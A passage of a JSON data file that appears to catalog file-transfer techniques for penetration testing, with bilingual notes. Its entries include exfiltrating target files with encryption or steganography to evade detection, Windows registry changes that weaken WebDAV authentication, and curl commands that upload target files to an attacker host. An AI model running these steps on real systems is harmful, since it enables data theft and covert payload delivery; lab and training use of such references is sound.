    "title": "xz + Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "compression",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "xz -9 -c \"{remotefile}\" | base64 -w0 > \"{remotefile}.xz.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.xz.b64\" | xz -d > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "xz",
      "base64"
    ],
    "note": {
      "en": "Best ratio of the classic compressors, but slower than gzip. Encode on RHOST, send the .xz.b64 file with any transport, then decode on LHOST.",
      "ru": "Лучшее сжатие среди классических компрессоров, но медленнее gzip. Кодируйте на RHOST, передайте файл .xz.b64 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-aes-exfil",
    "title": "AES-256 + Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "obfuscation",
    "priority": 30,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "openssl enc -aes-256-cbc -pbkdf2 -base64 -pass pass:'{rhost_pass}' -in \"{remotefile}\" -out \"{remotefile}.enc\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl enc -d -aes-256-cbc -pbkdf2 -base64 -pass pass:'{rhost_pass}' -in \"{lhostpath}/{file}.enc\" -out \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "openssl"
    ],
    "note": {
      "en": "Password-based AES with base64 armor. CBC without a MAC does not prove integrity, so compare hashes. Encode on RHOST, send the .enc file with any transport, then decode on LHOST.",
      "ru": "AES с паролем и base64-обёрткой. CBC без MAC не подтверждает целостность, поэтому сравните hash. Кодируйте на RHOST, передайте файл .enc любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-zstd-exfil",
    "title": "zstd + Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "compression",
    "priority": 30,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "zstd -19 -c \"{remotefile}\" | base64 -w0 > \"{remotefile}.zst.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.zst.b64\" | zstd -d > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "zstd",
      "base64"
    ],
    "note": {
      "en": "Modern balance: better than gzip and much faster than xz. Encode on RHOST, send the .zst.b64 file with any transport, then decode on LHOST.",
      "ru": "Современный баланс: лучше gzip и намного быстрее xz. Кодируйте на RHOST, передайте файл .zst.b64 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "7z-aes-deliver",
    "title": "7z AES-256 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encryption",
    "family": "7z",
    "priority": 10,
    "source": "11",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "7z a -p'{rhost_pass}' -mhe=on -mx=9 \"{lhostpath}/{file}.7z\" \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "7z x -y -p'{rhost_pass}' -o\"{remote}\" \"{remotefile}.7z\""
      }
    ],
    "requires": [
      "7z"
    ],
    "note": {
      "en": "Archives and encrypts with AES-256; -mhe=on also hides file names. Encrypt on LHOST, transfer the .7z file, decrypt on RHOST.",
      "ru": "Архивирует и шифрует AES-256; -mhe=on также скрывает имена файлов. Шифруйте на LHOST, передайте файл .7z и расшифруйте на RHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "age-pass-deliver",
    "title": "age (password) (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encryption",
    "family": "age",
    "priority": 10,
    "source": "11",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "age -p -o \"{lhostpath}/{file}.age\" \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "age -d -o \"{remotefile}\" \"{remotefile}.age\""
      }
    ],
    "requires": [
      "age"
    ],
    "note": {
      "en": "age prompts for the password on each side. Use a strong shared secret. Encrypt on LHOST, transfer the .age file, decrypt on RHOST.",
      "ru": "age спрашивает пароль на каждой стороне. Используйте надёжный общий секрет. Шифруйте на LHOST, передайте файл .age и расшифруйте на RHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "gpg-sym-deliver",
    "title": "gpg symmetric (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encryption",
    "family": "gpg",
    "priority": 10,
    "source": "11",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --symmetric --cipher-algo AES256 --output \"{lhostpath}/{file}.gpg\" \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --decrypt --output \"{remotefile}\" \"{remotefile}.gpg\""
      }
    ],
    "requires": [
      "gpg"
    ],
    "note": {
      "en": "Password-based gpg with AES256. Use the Advanced password field. Encrypt on LHOST, transfer the .gpg file, decrypt on RHOST.",
      "ru": "gpg с паролем и AES256. Используйте поле пароля в Advanced. Шифруйте на LHOST, передайте файл .gpg и расшифруйте на RHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "gpg-armor-deliver",
    "title": "gpg ASCII armor (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encryption",
    "family": "gpg",
    "priority": 20,
    "source": "11",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --symmetric --armor --cipher-algo AES256 --output \"{lhostpath}/{file}.asc\" \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --decrypt --output \"{remotefile}\" \"{remotefile}.asc\""
      }
    ],
    "requires": [
      "gpg"
    ],
    "note": {
      "en": "ASCII-armored gpg for text channels. Still uses the Advanced password. Encrypt on LHOST, transfer the .asc file, decrypt on RHOST.",
      "ru": "ASCII-armored gpg для текстовых каналов. Пароль берётся из Advanced. Шифруйте на LHOST, передайте файл .asc и расшифруйте на RHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "7z-aes-exfil",
    "title": "7z AES-256 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encryption",
    "family": "7z",
    "priority": 10,
    "source": "11",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "7z a -p'{rhost_pass}' -mhe=on -mx=9 \"{remotefile}.7z\" \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "7z x -y -p'{rhost_pass}' -o\"{lhostpath}\" \"{lhostpath}/{file}.7z\""
      }
    ],
    "requires": [
      "7z"
    ],
    "note": {
      "en": "Archives and encrypts with AES-256; -mhe=on also hides file names. Encrypt on RHOST, transfer the .7z file, decrypt on LHOST.",
      "ru": "Архивирует и шифрует AES-256; -mhe=on также скрывает имена файлов. Шифруйте на RHOST, передайте файл .7z и расшифруйте на LHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "age-pass-exfil",
    "title": "age (password) (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encryption",
    "family": "age",
    "priority": 10,
    "source": "11",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "age -p -o \"{remotefile}.age\" \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "age -d -o \"{lhostpath}/{file}\" \"{lhostpath}/{file}.age\""
      }
    ],
    "requires": [
      "age"
    ],
    "note": {
      "en": "age prompts for the password on each side. Use a strong shared secret. Encrypt on RHOST, transfer the .age file, decrypt on LHOST.",
      "ru": "age спрашивает пароль на каждой стороне. Используйте надёжный общий секрет. Шифруйте на RHOST, передайте файл .age и расшифруйте на LHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "gpg-sym-exfil",
    "title": "gpg symmetric (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encryption",
    "family": "gpg",
    "priority": 10,
    "source": "11",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --symmetric --cipher-algo AES256 --output \"{remotefile}.gpg\" \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --decrypt --output \"{lhostpath}/{file}\" \"{lhostpath}/{file}.gpg\""
      }
    ],
    "requires": [
      "gpg"
    ],
    "note": {
      "en": "Password-based gpg with AES256. Use the Advanced password field. Encrypt on RHOST, transfer the .gpg file, decrypt on LHOST.",
      "ru": "gpg с паролем и AES256. Используйте поле пароля в Advanced. Шифруйте на RHOST, передайте файл .gpg и расшифруйте на LHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "gpg-armor-exfil",
    "title": "gpg ASCII armor (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encryption",
    "family": "gpg",
    "priority": 20,
    "source": "11",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --symmetric --armor --cipher-algo AES256 --output \"{remotefile}.asc\" \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gpg --batch --yes --pinentry-mode loopback --passphrase '{rhost_pass}' --decrypt --output \"{lhostpath}/{file}\" \"{lhostpath}/{file}.asc\""
      }
    ],
    "requires": [
      "gpg"
    ],
    "note": {
      "en": "ASCII-armored gpg for text channels. Still uses the Advanced password. Encrypt on RHOST, transfer the .asc file, decrypt on LHOST.",
      "ru": "ASCII-armored gpg для текстовых каналов. Пароль берётся из Advanced. Шифруйте на RHOST, передайте файл .asc и расшифруйте на LHOST."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "steg-steghide-deliver",
    "title": "steghide embed (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "steghide",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "steghide embed -cf \"{lhostpath}/cover.jpg\" -ef \"{lhostpath}/{file}\" -sf \"{lhostpath}/{file}.stego.jpg\" -p '{rhost_pass}' -z 9"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "steghide extract -sf \"{remotefile}.stego.jpg\" -xf \"{remotefile}\" -p '{rhost_pass}'"
      }
    ],
    "requires": [
      "steghide"
    ],
    "note": {
      "en": "Requires /tmp/share/cover.jpg on LHOST. JPEG/BMP/WAV/AU only, no PNG.",
      "ru": "Нужен /tmp/share/cover.jpg на LHOST. Только JPEG/BMP/WAV/AU, PNG не поддерживается."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-openstego-deliver",
    "title": "OpenStego embed (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "openstego",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openstego embed -a randomlsb -e -A AES256 -mf \"{lhostpath}/{file}\" -cf \"{lhostpath}/cover.png\" -sf \"{lhostpath}/{file}.stego.png\" -p '{rhost_pass}'"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "openstego extract -a randomlsb -sf \"{remotefile}.stego.png\" -xf \"{remotefile}\" -p '{rhost_pass}'"
      }
    ],
    "requires": [
      "openstego"
    ],
    "note": {
      "en": "PNG/BMP carrier with AES256. Requires /tmp/share/cover.png on LHOST.",
      "ru": "PNG/BMP-носитель с AES256. Нужен /tmp/share/cover.png на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-outguess-deliver",
    "title": "outguess (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "outguess",
    "priority": 20,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "outguess -k '{rhost_pass}' -d \"{lhostpath}/{file}\" \"{lhostpath}/cover.jpg\" \"{lhostpath}/{file}.outguess.jpg\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "outguess -k '{rhost_pass}' -r \"{remotefile}.outguess.jpg\" \"{remotefile}\""
      }
    ],
    "requires": [
      "outguess"
    ],
    "note": {
      "en": "JPEG carrier; requires cover.jpg in the source directory. The key controls embedding but does not encrypt the payload.",
      "ru": "JPEG-носитель; нужен cover.jpg в каталоге источника. Ключ управляет встраиванием, но не шифрует payload."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-snow-deliver",
    "title": "snow (spaces) (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "snow",
    "priority": 20,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "snow -C -m \"$(base64 -w0 \"{lhostpath}/{file}\")\" -p '{rhost_pass}' \"{lhostpath}/cover.txt\" \"{lhostpath}/{file}.snow.txt\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "snow -C -p '{rhost_pass}' \"{remotefile}.snow.txt\" | base64 -d > \"{remotefile}\""
      }
    ],
    "requires": [
      "snow",
      "base64"
    ],
    "note": {
      "en": "Text carrier; requires cover.txt in the source directory. snow is only suitable for small payloads and bloats text badly.",
      "ru": "Текстовый носитель; нужен cover.txt в каталоге источника. snow годится только для небольших payload и сильно раздувает текст."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-append-deliver",
    "title": "Append after EOF (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "append",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cat \"{lhostpath}/{file}\" >> \"{lhostpath}/cover.jpg\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"d=open('{remotefile}','rb').read();i=d.find(b'PK\\\\x03\\\\x04');open('{remotefile}.out','wb').write(d[i:])\""
      }
    ],
    "requires": [
      "cat",
      "python3"
    ],
    "note": {
      "en": "Appends a ZIP payload to a JPEG. The file is not encrypted and is visible to binwalk; use it as a fast lab trick.",
      "ru": "Дописывает ZIP-payload в JPEG. Файл не шифруется и виден binwalk; быстрый лабораторный трюк."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-steghide-exfil",
    "title": "steghide embed (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "steghide",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "steghide embed -cf \"{remote}/cover.jpg\" -ef \"{remotefile}\" -sf \"{remotefile}.stego.jpg\" -p '{rhost_pass}' -z 9"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "steghide extract -sf \"{lhostpath}/{file}.stego.jpg\" -xf \"{lhostpath}/{file}\" -p '{rhost_pass}'"
      }
    ],
    "requires": [
      "steghide"
    ],
    "note": {
      "en": "Requires cover.jpg in the RHOST path. Transfer the .stego.jpg file, then extract it on LHOST.",
      "ru": "Нужен cover.jpg в каталоге RHOST. Передайте .stego.jpg и извлеките файл на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-openstego-exfil",
    "title": "OpenStego embed (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "openstego",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "openstego embed -a randomlsb -e -A AES256 -mf \"{remotefile}\" -cf \"{remote}/cover.png\" -sf \"{remotefile}.stego.png\" -p '{rhost_pass}'"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openstego extract -a randomlsb -sf \"{lhostpath}/{file}.stego.png\" -xf \"{lhostpath}/{file}\" -p '{rhost_pass}'"
      }
    ],
    "requires": [
      "openstego"
    ],
    "note": {
      "en": "Requires cover.png in the RHOST path. Transfer the stego PNG, then extract it on LHOST.",
      "ru": "Нужен cover.png в каталоге RHOST. Передайте stego PNG и извлеките файл на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-outguess-exfil",
    "title": "outguess (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "outguess",
    "priority": 20,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "outguess -k '{rhost_pass}' -d \"{remotefile}\" \"{remote}/cover.jpg\" \"{remotefile}.outguess.jpg\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "outguess -k '{rhost_pass}' -r \"{lhostpath}/{file}.outguess.jpg\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "outguess"
    ],
    "note": {
      "en": "JPEG carrier; requires cover.jpg in the source directory. The key controls embedding but does not encrypt the payload.",
      "ru": "JPEG-носитель; нужен cover.jpg в каталоге источника. Ключ управляет встраиванием, но не шифрует payload."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-snow-exfil",
    "title": "snow (spaces) (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "snow",
    "priority": 20,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "snow -C -m \"$(base64 -w0 \"{remotefile}\")\" -p '{rhost_pass}' \"{remote}/cover.txt\" \"{remotefile}.snow.txt\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "snow -C -p '{rhost_pass}' \"{lhostpath}/{file}.snow.txt\" | base64 -d > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "snow",
      "base64"
    ],
    "note": {
      "en": "Text carrier; requires cover.txt in the source directory. snow is only suitable for small payloads and bloats text badly.",
      "ru": "Текстовый носитель; нужен cover.txt в каталоге источника. snow годится только для небольших payload и сильно раздувает текст."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-append-exfil",
    "title": "Append after EOF (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "append",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cat \"{remotefile}\" >> \"{remote}/cover.jpg\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"d=open('{lhostpath}/{file}.jpg','rb').read();i=d.find(b'PK\\\\x03\\\\x04');open('{lhostpath}/{file}','wb').write(d[i:])\""
      }
    ],
    "requires": [
      "cat",
      "python3"
    ],
    "note": {
      "en": "Appends the payload to a cover JPEG. Transfer the JPEG, then extract the ZIP by its PK signature.",
      "ru": "Дописывает payload в cover JPEG. Передайте JPEG и извлеките ZIP по сигнатуре PK."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "webdav-enable-webclient",
    "title": "Enable WebClient service",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "webdav",
    "family": "setup",
    "priority": 10,
    "source": "04",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "sc query WebClient"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "sc config WebClient start= auto"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "net start WebClient"
      }
    ],
    "requires": [
      "Administrator"
    ],
    "note": {
      "en": "WebClient is disabled by default. Without it Windows cannot mount WebDAV through Explorer or net use. Quick access: **\\\\LHOST@PORT\\DavWWWRoot\\**.",
      "ru": "WebClient по умолчанию отключён. Без него Windows не смонтирует WebDAV через Explorer или net use. Быстрый доступ: **\\\\LHOST@PORT\\DavWWWRoot\\**."
    },
    "docs": "docs/en/04-webdav.md"
  },
  {
    "id": "webdav-registry",
    "title": "WebDAV registry for HTTP and size",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "webdav",
    "family": "setup",
    "priority": 20,
    "source": "04",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters /v BasicAuthLevel /t REG_DWORD /d 2 /f"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters /v FileSizeLimitInBytes /t REG_DWORD /d 4294967295 /f"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "net stop WebClient && net start WebClient"
      }
    ],
    "requires": [
      "Administrator"
    ],
    "warning": {
      "en": "Changes **HKLM\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters**. BasicAuthLevel=2 allows basic auth over HTTP; FileSizeLimitInBytes=4294967295 raises the ~50 MB limit. Lab only.",
      "ru": "Меняет **HKLM\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters**. BasicAuthLevel=2 разрешает basic auth по HTTP; FileSizeLimitInBytes=4294967295 поднимает лимит ~50 МБ. Только лаборатория."
    },
    "note": {
      "en": "After the change, restart WebClient. On a shared host, restore the original values when done.",
      "ru": "После изменения перезапустите WebClient. На общей машине верните исходные значения после работы."
    },
    "docs": "docs/en/04-webdav.md"
  },
  {
    "id": "webdav-https-download-linux",
    "title": "WebDAV HTTPS download (curl)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "webdav",
    "family": "native",
    "priority": 15,
    "source": "04",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 1 -subj \"/CN={lhost}\" && cp server.crt server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && rclone serve webdav . --addr :{lport} --user {share_user} --pass {share_pass} --cert server.pem --key server.key"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -k -u {share_user}:{share_pass} -o \"{remotefile}\" \"https://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "rclone",
      "openssl",
      "curl"
    ],
    "note": {
      "en": "Self-signed TLS with rclone. curl uses -k because the certificate is not trusted; use a real certificate outside the lab. wsgidav TLS requires a config file, so this variant uses rclone.",
      "ru": "TLS с самоподписанным сертификатом через rclone. curl использует -k, потому что сертификат недоверенный; вне лаборатории используйте настоящий сертификат. Для TLS в wsgidav нужен конфиг, поэтому здесь rclone."
    },
    "docs": "docs/en/04-webdav.md"
  },
  {
    "id": "webdav-https-download-win",
    "title": "WebDAV HTTPS download (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "webdav",
    "family": "native",
    "priority": 16,
    "source": "04",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 1 -subj \"/CN={lhost}\" && cp server.crt server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && rclone serve webdav . --addr :{lport} --user {share_user} --pass {share_pass} --cert server.pem --key server.key"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -k -u {share_user}:{share_pass} -o \"{remotefile}\" \"https://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "rclone",
      "openssl",
      "curl.exe"
    ],
    "note": {
      "en": "Self-signed TLS with rclone. curl.exe uses -k; Windows WebClient will usually reject this certificate, so use curl for HTTPS.",
      "ru": "TLS с самоподписанным сертификатом через rclone. curl.exe использует -k; Windows WebClient обычно отвергает такой сертификат, поэтому для HTTPS используйте curl."
    },
    "docs": "docs/en/04-webdav.md"
  },
  {
    "id": "webdav-https-upload-linux",
    "title": "WebDAV HTTPS upload (curl)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "webdav",
    "family": "native",
    "priority": 25,
    "source": "04",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 1 -subj \"/CN={lhost}\" && cp server.crt server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && rclone serve webdav . --addr :{lport} --user {share_user} --pass {share_pass} --cert server.pem --key server.key"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -k -u {share_user}:{share_pass} -T \"{remotefile}\" \"https://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "rclone",
      "openssl",
      "curl"
    ],
    "note": {
      "en": "Self-signed TLS with rclone. Upload uses curl -k; replace the certificate for anything beyond a lab.",
      "ru": "TLS с самоподписанным сертификатом через rclone. Загрузка через curl -k; замените сертификат для чего-то кроме лаборатории."
    },
    "docs": "docs/en/04-webdav.md"
  },
  {
    "id": "webdav-https-upload-win",
    "title": "WebDAV HTTPS upload (Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "webdav",
    "family": "native",
    "priority": 26,
    "source": "04",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 1 -subj \"/CN={lhost}\" && cp server.crt server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && rclone serve webdav . --addr :{lport} --user {share_user} --pass {share_pass} --cert server.pem --key server.key"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -k -u {share_user}:{share_pass} -T \"{remotefile}\" \"https://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "rclone",
      "openssl",
      "curl.exe"
    ],
    "note": {
      "en": "Self-signed TLS with rclone. Upload uses curl.exe -k; Windows WebClient usually rejects the self-signed cert, so curl is the reliable HTTPS path.",
      "ru": "TLS с самоподписанным сертификатом через rclone. Загрузка через curl.exe -k; Windows WebClient обычно отвергает самоподписанный сертификат, поэтому надёжный путь — curl."
    },
    "docs": "docs/en/04-webdav.md"
  },
  {
    "id": "https-download-linux",
    "title": "HTTPS download (curl, Linux)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "https",
    "family": "openssl",
    "priority": 10,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl s_server -accept {lport} -cert /tmp/server.crt -key /tmp/server.key -WWW"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "curl -k \"https://{lhost}:{lport}/{file}\" -o \"{remotefile}\""
      }
    ],
    "requires": [
      "openssl",
      "curl"
    ],
    "note": {
      "en": "Self-signed HTTPS server via openssl s_server -WWW. curl uses -k because the certificate is not trusted.",
      "ru": "HTTPS-сервер с самоподписанным сертификатом через openssl s_server -WWW. curl использует -k, потому что сертификат недоверенный."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "https-download-win",
    "title": "HTTPS download (curl.exe, Windows)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "https",
    "family": "openssl",
    "priority": 20,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/server.key -out /tmp/server.crt -days 1 -subj \"/CN={lhost}\" && cat /tmp/server.crt /tmp/server.key > /tmp/server.pem"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && openssl s_server -accept {lport} -cert /tmp/server.crt -key /tmp/server.key -WWW"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "curl.exe -k \"https://{lhost}:{lport}/{file}\" -o \"{remotefile}\""
      }
    ],
    "requires": [
      "openssl",
      "curl.exe"
    ],
    "note": {
      "en": "Self-signed HTTPS server. curl.exe uses -k; use a trusted certificate outside the lab.",
      "ru": "HTTPS-сервер с самоподписанным сертификатом. curl.exe использует -k; вне лаборатории используйте доверенный сертификат."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "https-download-ps",
    "title": "HTTPS download (PowerShell 7)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "https",
    "family": "powershell",
    "priority": 10,
    "source": "01",
